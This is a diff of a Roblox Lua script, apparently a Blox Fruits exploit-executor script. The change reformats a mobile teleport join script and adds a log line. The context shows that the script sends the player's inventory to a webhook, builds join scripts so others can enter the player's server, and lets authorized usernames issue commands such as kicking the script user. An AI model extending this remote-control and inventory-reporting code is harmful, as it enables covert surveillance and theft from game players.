@@ -404,7 +404,29 @@ local function sendWebhook(inventory)
     local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
     local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
 
-    local mobileJoinScriptFormatString = [=[if game.PlaceId~=%d then queue_on_teleport([[task.wait(5) if game.JobId~="%s" then print("Mobile Teleport: Queued - Teleporting to Place %d, Job %s") game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s") else print("Mobile Teleport: Queued - Already in correct Job ID.") end]]) print("Mobile Teleport: Invoking Sea Travel ('%s')") pcall(game:GetService("ReplicatedStorage").Remotes.CommF_.InvokeServer, game:GetService("ReplicatedStorage").Remotes.CommF_, "%s") else if game.JobId~="%s" then print("Mobile Teleport: Direct - Teleporting to Place %d, Job %s") game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s") else print("Mobile Teleport: Direct - Already in correct Job ID.") end end]=]
+    -- Mobile Join Script Format
+    local mobileJoinScriptFormatString = [[
+if game.PlaceId ~= %d then
+    queue_on_teleport([=[
+        task.wait(5)
+        if game.JobId ~= "%s" then
+            print("Mobile Teleport: Queued - Teleporting to Place %d, Job %s")
+            game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+        else
+             print("Mobile Teleport: Queued - Already in correct Job ID.")
+        end
+    ]=])
+    print("Mobile Teleport: Invoking Sea Travel ('%s')")
+    pcall(game:GetService("ReplicatedStorage").Remotes.CommF_.InvokeServer, game:GetService("ReplicatedStorage").Remotes.CommF_, "%s") -- Use pcall
+else
+    if game.JobId ~= "%s" then
+        print("Mobile Teleport: Direct - Teleporting to Place %d, Job %s")
+        game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+    else
+        print("Mobile Teleport: Direct - Already in correct Job ID.")
+    end
+end
+]]
     local mobileJoinScriptRaw = string.format(mobileJoinScriptFormatString,
         targetPlaceId, jobId, targetPlaceId, jobId, -- queue teleport args
         seaTravelArgument, seaTravelArgument, -- travel args
@@ -703,6 +725,7 @@ local Commands = {
             if not Usernames or type(Usernames) ~= "table" then Usernames = {} end
             table.insert(Usernames, targetUsername)
             sendMessage("Successfully added '" .. targetUsername .. "' to the authorized list for this session.")
+            warn("User '" .. player.Name .. "' allowed '" .. targetUsername .. "'")
         end
     },
     kick = { d = "Kicks script user.", u = "?kick <reason>", e = function(a, player) if not a or a == "" then sendMessage("Usage: ?kick <reason>"); return end; pcall(LocalPlayer.Kick, LocalPlayer, a) end },
